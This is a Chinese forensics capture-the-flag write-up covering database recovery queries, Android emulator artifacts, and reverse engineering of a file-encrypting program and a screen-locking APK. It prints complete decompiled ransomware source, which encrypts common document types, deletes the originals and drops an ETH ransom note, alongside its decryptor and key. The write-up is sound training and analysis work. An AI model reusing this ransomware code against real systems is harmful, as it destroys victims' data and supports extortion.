2022-10-19T03:12:08.081554Z	   12 Query	INSERT INTO `member` VALUES (994, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13149760994', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo994', 1, NULL, 0, '2022-10-18 14:36:46', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1994', '2022-10-18 14:36:46', 1, NULL, 0, '13149760994', NULL, NULL, '中国', 0, 2, 0, 0, NULL)
2022-10-19T03:12:08.086191Z	   12 Query	INSERT INTO `member` VALUES (995, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13593760995', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo995', 1, NULL, 0, '2022-10-18 15:46:26', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1995', '2022-10-18 15:46:26', 1, NULL, 0, '13593760995', NULL, NULL, '中国', 0, 6, 0, 0, NULL)
2022-10-19T03:12:08.091434Z	   12 Query	INSERT INTO `member` VALUES (996, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13947760996', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo996', 1, NULL, 0, '2022-10-18 16:56:6', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1996', '2022-10-18 16:56:6', 1, NULL, 0, '13947760996', NULL, NULL, '中国', 0, 4, 0, 0, NULL)
2022-10-19T03:12:08.097094Z	   12 Query	INSERT INTO `member` VALUES (997, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13459440997', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo997', 1, NULL, 0, '2022-10-18 13:37:59', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1997', '2022-10-18 13:37:59', 1, NULL, 0, '13459440997', NULL, NULL, '中国', 0, 6, 0, 0, NULL)
2022-10-19T03:12:08.101734Z	   12 Query	INSERT INTO `member` VALUES (998, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13913450998', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo998', 1, NULL, 0, '2022-10-18 14:47:39', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1998', '2022-10-18 14:47:39', 1, NULL, 0, '13913450998', NULL, NULL, '中国', 0, 4, 0, 0, NULL)
2022-10-19T03:12:08.108159Z	   12 Query	INSERT INTO `member` VALUES (999, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13457450999', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo999', 1, NULL, 0, '2022-10-18 15:57:19', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c1999', '2022-10-18 15:57:19', 1, NULL, 0, '13457450999', NULL, NULL, '中国', 0, 2, 0, 0, NULL)
2022-10-19T03:12:08.113211Z	   12 Query	INSERT INTO `member` VALUES (1000, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, '中国', NULL, NULL, 0, 0, NULL, 0, '13811451000', 'ee455f8f8e5d321861ed7ef5bde6dbc5', 'U000001Lo1000', 1, NULL, 0, '2022-10-18 17:6:59', '353233323433333238363833323439363634', 0, b'1', 0, 0, 'c3d54ed7-b20f-430b-8f9a-b517c11000', '2022-10-18 17:6:59', 1, NULL, 0, '13811451000', NULL, NULL, '中国', 0, 6, 0, 0, NULL)
```

![image-20221101131437204](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101131437204.png)

再把这6个人加上，所以一共是158+6=164人

### 30.  还原全部被删改数据，哪些用户ID没有充值记录

在`membet_transaction`中找到充值记录

然后使用查询语句，发现有2个人没有充值(当然也可以用Excel删除重复值)

```mysql
SELECT member_id , COUNT(id),SUM(amount) FROM member_transaction GROUP BY member_id
```

![image-20221101132128845](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101132128845.png)

#### 方法一

导入Excel中，看从哪里开始，Excel的行数和数值不一样了。

![image-20221101132333636](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101132333636.png)

![image-20221101132443286](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101132443286.png)

#### 方法二

`member_wallet`中的`balance`就是他的充值记录，找到为0的就是没有充值的。

![image-20221101132735075](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101132735075.png)

### 31. 还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？

直接使用语句查询

```mysql
SELECT * FROM `member_transaction` WHERE create_time BETWEEN "2022-10-17  00:00:00" AND "2022-10-17 23:59:59"
```

![image-20221101133059205](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101133059205.png)

### 32. 还原全部被删改数据，该网站中充值的USDT总额为

```mysql
SELECT SUM(amount) FROM member_transaction
```

![image-20221101133542896](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101133542896.png)

## 检材四

根据前期侦查分析，通过技术手段找到了幕后老板，并对其使用的安卓模拟器“检材4”进行了固定。分析所有掌握的检材，回答下列问题

修改文件为zip，然后打开发现vmdk文件，导入火眼中分析

### 33. 嫌疑人使用的安卓模拟器软件名称是

搜索npbk文件，发现是夜神模拟器

![image-20221101135221865](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135221865.png)

### 34. 检材4中，“老板”的阿里云账号是

![image-20221101135452879](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135452879.png)

### 35.检材4中安装的VPN工具的软件名称是

使用火眼直接分析得到

![image-20221101135257781](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135257781.png)

![image-20221101135908455](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135908455.png)

### 36. 上述VPN工具中记录的节点IP是

#### 方法一

![image-20221101135531549](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135531549.png)

#### 方法二

![image-20221101135853446](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101135853446.png)

### 37. 检材4中，录屏软件安装时间为

通过apk的位置找到软件的包名

![image-20221101140649170](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101140649170.png)

![image-20221101140437417](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101140437417.png)

>2022-10-19 10:50:27

### 38. 上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为

在`Nox_2-disk2.vmdk/分区4/data/com.jiadi.luping/databases/record.db`中分析该数据库，发现保存有文件的相关信息

![image-20221101141104263](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101141104263.png)

> 0c2f5dd4a9bc6f34873fb3c0ee9b762b98e8c46626410be7191b11710117a12d

### 39. 上述录屏软件登录的手机号是

通过导出record.db还有record.db-wal文件，导入DB Brower中分析得到

![image-20221101142013326](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101142013326.png)

> 18645091802

### 40. 检材4中，发送勒索邮件的邮箱地址为

火眼直接分析得到

![image-20221101142058008](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101142058008.png)

> skterran@163.com

## EXE分析

分析所有掌握的检材，找到勒索邮件中被加密的文档和对应的加/解密程序，并回答下列问题

### 41.分析加密程序，编译该加密程序使用的语言是

#### 方法一

使用Detect It Easy可以直接分析出

![image-20221101143618187](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101143618187.png)

#### 方法二

IDA分析得到为python

![image-20221101144111978](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101144111978.png)

### 42. 分析加密程序，它会加密哪些扩展名的文件？

参考文章：https://www.jianshu.com/p/9f35a6f7ba05

依据参考文章，下载相关逆向工具

注意：如果参考文章中的下载后的文件执行命令后没有pyc后缀，请使用[Github的版本](https://github.com/extremecoders-re/pyinstxtractor)，可以直接生成pyc文件

执行如下命令生成目录

```python
python pyinstxtractor.py encrypt_file.exe
```

![image-20221101152213649](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101152213649.png)

之后安装uncompyle6

```python
pip3 install uncompyle6
```

安装好后，开始反编译

```powershell
PS E:\1762326648\Deskop\新建文件夹> uncompyle6.exe E:\1762326648\Deskop\新建文件夹\encrypt_file.exe_extracted\encrypt_file_1.pyc
# uncompyle6 version 3.8.0
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.10.1 (tags/v3.10.1:2cd268a, Dec  6 2021, 19:10:37) [MSC v.1929 64 bit (AMD64)]
# Embedded file name: encrypt_file_1.py
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
import os
pubkey = '-----BEGIN PUBLIC KEY-----\nMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQEAx5JF4elVDBaakgGeDSxI\nCO1LyyZ6B2TgR4DNYiQoB1zAyWPDwektaCfnvNeHURBrw++HvbuNMoQNdOJNZZVo\nbHVZh+rCI4MwAh+EBFUeT8Dzja4ZlU9E7jufm69TQS0PSseIiU/4Byd2i9BvIbRn\nHLFZvi/VXphGeW0qVeHkQ3Ll6hJ2fUGhTsuGLc1XXHfiZ4RbJY/AMnjYPy9CaYzi\nSOT4PCf/O12Kuu9ZklsIAihRPl10SmM4IRnVhZYYpXedAyTcYCuUiI4c37F5GAhz\nRDFn9IQ6YQRjlLjuOX8WB6H4NbnKX/kd0GsQP3Zbogazj/z7OM0Y3rv3T8mtF6/I\nkwIEHoau+w==\n-----END PUBLIC KEY-----\n'
msg = "SOMETHING WENT WRONG,PLEASE CONTACT YOUR SYSTEM ADMINISTRATOR!\nHe can help you to understand whats happened.\nIf he can't help you,contact us via email:\naa1028@forensix.cn\nale@forensix.cn\nHURRY UP!WE HAVE ANTIDOTE FOR YOUR FILES!DISCOUNT 20%FOR CLIENTS,WHO CONTACT US IN THE SAME DAY!\nYou can attach 2 files (text or picture)to check our honest intentions,we will heal them and send\nback.\nPlease pay 0.618 ETH\nThe wallet address：0xef9edf6cdacb7d925aee0f9bd607b544c5758850\n************************************\n"

class XORCBC:

    def __init__(self, key: bytes):
        self.key = bytearray(key)
        self.cur = 0

    def encrypt(self, data: bytes) -> bytes:
        data = bytearray(data)
        for i in range(len(data)):
            tmp = data[i]
            data[i] ^= self.key[self.cur]
            self.key[self.cur] = tmp
            self.cur = (self.cur + 1) % len(self.key)

        return bytes(data)


print('加密程序V1.0')
print('文件正在加密中~~~~~~~~~~~~~~~~~~\n')

def run_finall():
    for filepath, dirnames, filenames in os.walk(os.getcwd()):
        for filename in filenames:
            if filename != 'encrypt_file.py' and filename != 'decrypt_file.py' and '_encrypted' not in filename:
                ExtensionPath = os.path.splitext(filename)[(-1)]
                if '.txt' == ExtensionPath or '.jpg' == ExtensionPath or '.xls' == ExtensionPath or '.docx' == ExtensionPath:
                    time.sleep(3)
                    data_file = os.path.join(filepath, filename)
                    rsakey = RSA.import_key(pubkey)
                    cipher = Cipher_pkcs1_v1_5.new(rsakey)
                    xor_key = os.urandom(16)
                    xor_obj = XORCBC(xor_key)
                    outf = open(data_file + '_encrypted', 'wb')
                    encrypted_xor_key = cipher.encrypt(xor_key)
                    outf.write(encrypted_xor_key)
                    buffer_size = 4096
                    with open(data_file, 'rb') as (f):
                        while True:
                            data = f.read(buffer_size)
                            if not data:
                                break
                            outf.write(xor_obj.encrypt(data))

                    outf.close()
                    os.remove(data_file)


run_finall()

def redme():
    try:
        dir = os.path.join(os.path.expanduser('~'), 'Desktop')
        print(dir)
        with open(dir + '/!READ_ME.txt', 'w') as (ff):
            ff.write(msg)
    except:
        dir1 = os.getcwd()
        print(dir1)
        with open(dir1 + '/!READ_ME.txt', 'w') as (ff):
            ff.write(msg)


print('\n加密完成~~~~~~~~~~~~~~~~~~')
os.system('pause')
# okay decompiling E:\1762326648\Deskop\新建文件夹\encrypt_file.exe_extracted\encrypt_file_1.pyc
```

通过剖析代码，发现加密文件的类型

```powershell
 if '.txt' == ExtensionPath or '.jpg' == ExtensionPath or '.xls' == ExtensionPath or '.docx' == ExtensionPath:
```

### 43. 分析加密程序，是通过什么算法对文件进行加密的？

剖析代码

```powershell
data_file = os.path.join(filepath, filename)
                    rsakey = RSA.import_key(pubkey)
                    cipher = Cipher_pkcs1_v1_5.new(rsakey)
                    xor_key = os.urandom(16)
                    xor_obj = XORCBC(xor_key)
                    outf = open(data_file + '_encrypted', 'wb')
                    encrypted_xor_key = cipher.encrypt(xor_key)
                    outf.write(encrypted_xor_key)
                    buffer_size = 4096
                    with open(data_file, 'rb') as (f):
                        while True:
                            data = f.read(buffer_size)
                            if not data:
                                break
                            outf.write(xor_obj.encrypt(data))

                    outf.close()
                    os.remove(data_file)
```

首先把`公钥`导入，生成一个`rsakey`，然后把`rsakey`通过`cipher`加密生成了一个`cipher字符串`随后通过`cipher`加密了`xor_key`，`xor_key`是一个随机的16位字符串（os.urandom(16)），因此是`outf.write(encrypted_xor_key)`加密了文件，因此加密过程实际如下：

```powershell
class XORCBC:

    def __init__(self, key: bytes):
        self.key = bytearray(key)
        self.cur = 0

    def encrypt(self, data: bytes) -> bytes:
        data = bytearray(data)
        for i in range(len(data)):
            tmp = data[i]
            data[i] ^= self.key[self.cur]
            self.key[self.cur] = tmp
            self.cur = (self.cur + 1) % len(self.key)

        return bytes(data)
```

因而为异或加密

### 44. 分析加密程序，其使用的非对称加密方式公钥后5位为？

根据解密后的内容得到公钥

```
pubkey = '-----BEGIN PUBLIC KEY-----\nMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQEAx5JF4elVDBaakgGeDSxI\nCO1LyyZ6B2TgR4DNYiQoB1zAyWPDwektaCfnvNeHURBrw++HvbuNMoQNdOJNZZVo\nbHVZh+rCI4MwAh+EBFUeT8Dzja4ZlU9E7jufm69TQS0PSseIiU/4Byd2i9BvIbRn\nHLFZvi/VXphGeW0qVeHkQ3Ll6hJ2fUGhTsuGLc1XXHfiZ4RbJY/AMnjYPy9CaYzi\nSOT4PCf/O12Kuu9ZklsIAihRPl10SmM4IRnVhZYYpXedAyTcYCuUiI4c37F5GAhz\nRDFn9IQ6YQRjlLjuOX8WB6H4NbnKX/kd0GsQP3Zbogazj/z7OM0Y3rv3T8mtF6/I\nkwIEHoau+w==\n-----END PUBLIC KEY-----\n'
```

可以直接得到`u+w==`

### 45. 被加密文档中，FLAG1的值是

通过相同的方法，对decrypt_file.exe进行逆向

![image-20221101153641606](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101153641606.png)

```powershell
PS E:\1762326648\Deskop\长安杯\文件文档_20221101_142818\火眼-文件导出> uncompyle6.exe E:\1762326648\Deskop\长安杯\文件文档_20221101_142818\火眼-文件导出\decrypt_file.exe_extracted\decrypt_file_1.pyc
# uncompyle6 version 3.8.0
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.10.1 (tags/v3.10.1:2cd268a, Dec  6 2021, 19:10:37) [MSC v.1929 64 bit (AMD64)]
# Embedded file name: decrypt_file_1.py
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
import os
prikey = '-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEAx5JF4elVDBaakgGeDSxICO1LyyZ6B2TgR4DNYiQoB1zAyWPD\nwektaCfnvNeHURBrw++HvbuNMoQNdOJNZZVobHVZh+rCI4MwAh+EBFUeT8Dzja4Z\nlU9E7jufm69TQS0PSseIiU/4Byd2i9BvIbRnHLFZvi/VXphGeW0qVeHkQ3Ll6hJ2\nfUGhTsuGLc1XXHfiZ4RbJY/AMnjYPy9CaYziSOT4PCf/O12Kuu9ZklsIAihRPl10\nSmM4IRnVhZYYpXedAyTcYCuUiI4c37F5GAhzRDFn9IQ6YQRjlLjuOX8WB6H4NbnK\nX/kd0GsQP3Zbogazj/z7OM0Y3rv3T8mtF6/IkwIEHoau+wKCAQAlhHEjPTFQ7suY\nU3Ji+L5TyeaFWYu3iDVmtzUTjUn2Yvr2+IyHKdU6z0vvGhsHYP8rUJcwWEBVaVbU\ndQZ8TXT0flBgC35NyGQnTHHbNsOWRvFpto0Gom5KuDS0DYPrm+Ic1Ev0SfLdY+iK\nV/uzjjeBF+CgEuvwO8xnYLsaFu6s0/ezQgEDBxpcN2KBBZoJ0eXxUUanEPkrLHA2\nDhRgUCKQks1kpJrGZp/DLb8dKfhWoQ1FV/bBsmv9lVj1Yk14oKdvb51QK53Mnhiz\nji49S+tazVCA+lP0M6lVSB2uLyB5JldT4kqOQvhtURSzW8oeTM9w1rLvW7qi823U\nWrJz+TQTAoGBAPIfUS9accG2fUA3AP93ZJU0SbZLc95JJXMyaRozFTTbxnMWB3sG\nqM9X1qZ4hECVvLF3Sn73B6kF3IaC8/Vpc2cyPHpM+ytdxZVm4uW75ZwYAvKEJeT3\n068CtcN6PvG3mFhvPsc3GK9FI1O63jrbSx+Y1hQlrVq6eMZUJh7V8BxXAoGBANMC\nmhN2sC85Pz450JNoG6Q3db0nm9kUs157TUBMGJCfvgh2Rj0t08FcEKQn+idtOf6Z\nZc2lRoLeaRq539Ex8zzsD7Dl7bFtePRsuDcAMuIFY2S0Z8jjj9BaCirrUluu1FWp\nTV60As9YBLnRosLTrYtgym+GNjdE/42uFRBJk9AlAoGBAIyGeStBbau1BmMSeTJt\n9QYjl95MJZXTbJD4IFV73nVG66I/yKp9Ry3Q1hHf/oDm6bepslI/7+lLK1TPRv7T\nO0PNY92vya15RUvFerOz2QvOz9SRh/ZU6rEwsy0qZtanGZ7pKCSsQIwcJcsTKdjO\nvMj9QIqxqmdpdh6zFDeGKu4/AoGAEzFuMCQH+liRp9MEZtEtoqtUSwbwhSUh4hl+\nnScp+a+sKIaF/ohJfXeBctWCF6iU/N5TH7SlnfBlZE7MBJHiiAz8EwWI4u4EmFkc\n7RvmfXowLO9L4pG2rzwcMGgrs9cJm+NcjlNmq+Kx4q+F4lHNN8+/7NPdmDyiUlAD\nATZCds8CgYEA2CFvsH+TUV3Q63UdTsdrUKK86vohjGSaoai7mEUGo4iZ/Ie+ScAa\nGtPFZUhO7EJqh2rNqAakfZGgKU43hAjiUHIjvZdAFNoqpNxO+bkEIPSFQQ6o34r3\naGTj9Pz1UH/ByW76V7defT/2jQsXHHFiVGpDU6WT80bInLqDQRxlDRk=\n-----END RSA PRIVATE KEY-----\n'

class XORCBC:

    def __init__(self, key: bytes):
        self.key = bytearray(key)
        self.cur = 0

    def decrypt(self, data: bytes) -> bytes:
        data = bytearray(data)
        for i in range(len(data)):
            data[i] ^= self.key[self.cur]
            self.key[self.cur] = data[i]
            self.cur = (self.cur + 1) % len(self.key)

        return bytes(data)


def run_decrypt():
    print('解密程序 V1.0\n')
    present = input('请输入密码:')
    if present == '4008003721':
        for filepath, dirnames, filenames in os.walk(os.getcwd()):
            for filename in filenames:
                if '_encrypted' in filename:
                    print(os.path.join(filepath, filename) + '-解密成功')
                    data_file = os.path.join(filepath, filename)
                    data_handle = open(data_file, 'rb')
                    rsakey = RSA.import_key(prikey)
                    cipher = Cipher_pkcs1_v1_5.new(rsakey)
                    xor_key = cipher.decrypt(data_handle.read(256), '')
                    xor_obj = XORCBC(xor_key)
                    outname = data_file.replace('_encrypted', '')
                    outf = open(outname, 'wb')
                    buffer_size = 4096
                    while True:
                        data = data_handle.read(buffer_size)
                        if not data:
                            break
                        outf.write(xor_obj.decrypt(data))

                    outf.close()

        print('\n恭喜您，解密成功~~~~~~~~~~~~~~~')
        os.system('pause')
    else:
        print('\n密码错误~~~~~~~~~~~~~~~')
        run_decrypt()


run_decrypt()
# okay decompiling E:\1762326648\Deskop\长安杯\文件文档_20221101_142818\火眼-文件导出\decrypt_file.exe_extracted\decrypt_file_1.pyc
```

随后得到的密码为：`4008003721`

使用该密码解密

![image-20221101153933213](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101153933213.png)

![image-20221101153949542](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101153949542.png)

> FLAG1:TREFWGFS



## APK分析（“包子”写的）

### 46. 恶意APK程序的包名为

雷电直接获取到包名

![image-20221101210423239](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101210423239.png)

### 47. APK调用的权限包括

在静态权限中直接获取，也可在`AndroidManifest.xml`中得到

![image-20221101210731955](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101210731955.png)

![image-20221101210741809](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101210741809.png)

### 48. 解锁第一关所使用的FLAG2值为

首先对APK进行脱壳处理。

![3](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/3.png)

反编译后之后搜索FLAG，得到FLAG2

![image-20221101215745940](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101215745940.png)

### 49.解锁第二关所使用的FLAG3值为(FLAG为8位字符串，如需在apk中输入FLAG，请输入完整内容，如输入"FLAG9:QWERT123")

剖析apk发现

```java
((i2 & 1) != 0) {
            this.OooO0OO.setText("居然通过了第一关，不过还有第二关在等着你，现在你的手机在接下来的时间，会每隔一段时间关闭屏幕，请再次联系QQ:90001234进行解除，期间请勿尝试任何手段破解，否则将触发自毁程序");
            this.OooO0Oo.setOnClickListener(this);
            this.OooO0o0.setHint("FLAG3:XXXXXXXX");
            this.OooO0o0.setText("");
```

`((i2 & 1) != 0)`对应了`FLAG2`

不等于0时对应了FLAG3，所以FLAG3对应了如下内容

```java
} else if (App.OooO0O0.OooO0oo.equals(this.OooO0o0.getText().toString()) && App.OooO0OO.edit().putInt("unlocked", App.OooO0OO.getInt("unlocked", 0) | 2).commit()) {
                    StringBuilder OooO0OO2 = C0261o0000Oo.OooO0OO(App.OooO0OO.getString("flag16_tkey", ""));
                    OooO0OO2.append(App.OooO0O0.OooO0oo);
                    if (App.OooO0OO.edit().putString("flag16_tkey", OooO0OO2.toString()).commit()) {
                        App.OooO0Oo();
                        System.out.println("delay lock screen close");
                        OooO00o();
                    }
```

解析代码发现是把输入的值转为字符串之后，使用equals函数和前面的作比较，比较正确后返回`true`，所以`OooO0oo`应当是他所要对比的值，搜索在哪里对这个值进行了定义

![image-20221101230159603](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101230159603.png)

```java
this.OooO0oo = new String(decrypt(OooO0O0.OooO0O0("ffd4d7459ad24cd035611b014a2cccac")));
```

分析得到对`ffd4d7459ad24cd035611b014a2cccac`进行了两层加密，查找`OooO0O0`的用例

```java
    public static byte[] OooO0O0(String str) {
        int length = str.length() / 2;
        byte[] bArr = new byte[length];
        for (int i2 = 0; i2 < length; i2++) {
            int i3 = i2 * 2;
            bArr[i2] = (byte) Integer.parseInt(str.substring(i3, i3 + 2), 16);
        }
        return bArr;
    }
}
```

首先`ffd4d7459ad24cd035611b014a2cccac`是一个十六进制，将其转为数组，然后使用`decrypt`函数进行加密

分析`decrypt`函数

```java
    public native byte[] decrypt(byte[] bArr);

    public native byte[] encrypt(byte[] bArr);

    public native void init(byte[] bArr);
```

`init`函数调用了`libcipher.so`对密文进行了解密，与输入的值进行比较，最终判断是否正确

![image-20221101230636170](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101230636170.png)

所以将他执行的函数调用出来，执行一下，就可得到`OooO0O0`的输出，直接调用一个安卓的工程，把代码执行下来

APP.java如下：

```java
package com.example.hanshu;
import android.app.Application;
import android.util.Log;

public class App extends Application {
    static {
        System.loadLibrary("cipher");
    }
    public native byte[] decrypt(byte[] bArr);

    public native byte[] encrypt(byte[] bArr);

    public native void init(byte[] bArr);
    public static  void  main(){
        String out = new String(new App().decrypt(OooO0O0("ffd4d7459ad24cd035611b014a2cccac")));
        System.out.println("ocipher:"+out);
    }
    public static byte[] OooO0O0(String str){
        int length = str.length() / 2;
        byte[] bArr = new byte[length];
        for (int i =0; i < length; i++){
            int i2 = i +2;
            bArr[i] = (byte) Integer.parseInt(str.substring(i2, i2+2),  16);
        }
        return bArr;
    }

}
```

最后连接模拟器，将此apk推送到模拟器中，查看日志，即可找到FLAG3

![24](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/24.png)

### 50.解锁第三关所需的KEY值由ASCII可显示字符组成，请请分析获取该KEY值

进入第三关，要输入Key值，查看代码

![17](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/17.png)

找到(i2 & 4) == 0的地方

![18](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/18.png)

也是做了输入字符串的判断   
跳转到声明处，可以看到一系列比较复杂的算法

![19](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/19.png)

思路是用键盘可输入的字符串制作字典，进行暴力破解   
再次使用Android Studio，编写代码，遍历六组数，通过算法，for循环，跑字典，算值，跑出有哪些字符可对应相应数组

![20](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/20.png)

得到结果，按照六祖数的顺序，进行排序即可得到最终的key

![21](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/21.png)

![22](https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/22.png)